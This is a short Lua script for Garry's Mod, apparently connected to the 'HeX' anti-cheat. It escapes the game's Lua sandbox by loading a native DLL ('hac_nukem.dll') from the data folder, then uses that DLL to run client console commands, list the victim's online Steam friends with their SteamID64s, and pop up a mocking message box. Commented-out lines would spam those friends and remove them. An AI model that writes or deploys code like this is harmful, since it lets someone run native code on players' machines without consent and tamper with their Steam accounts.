
local function LoadLibrary(Cont)
	local LoadLib = package.loaders[3]
	if not LoadLib then return "No loader" end
	
	local Name = Cont
	
	package.cpath = "garrysmod/data/"..Name
	return pcall(LoadLib, Name, "DllMain")
end


--print( LoadLibrary( file.Read("hac_nukem.dll", "DATA") ) )

_G["[Nukem] HeX has balls of steel!\n"] = false

if not nukem then
	LoadLibrary("hac_nukem.dll")
end


timer.Simple(1, function()
	if not nukem then print("! failed") return end
	
	PrintTable(nukem)
	
	timer.Simple(1.5, function()
		print("! trying..")
		
		nukem.ClientCmd("echo lol")
		
		
		for Him=0, nukem.steam.GetAll() do
			if not nukem.steam.IsOnline(Him) then continue end
			
			local SID64 = nukem.steam.ToSID64(Him)
			print("! him: ", Him, SID64)
			--nukem.steam.Spam(Him, "LOL"..tostring(Him):rep(32) )
			
			--nukem.steam.Remove(SID64)
		end
		
		--nukem.EjectAll()
		
		nukem.MessageBox("Moon Sausage", "User is failure.")
	end)
end)


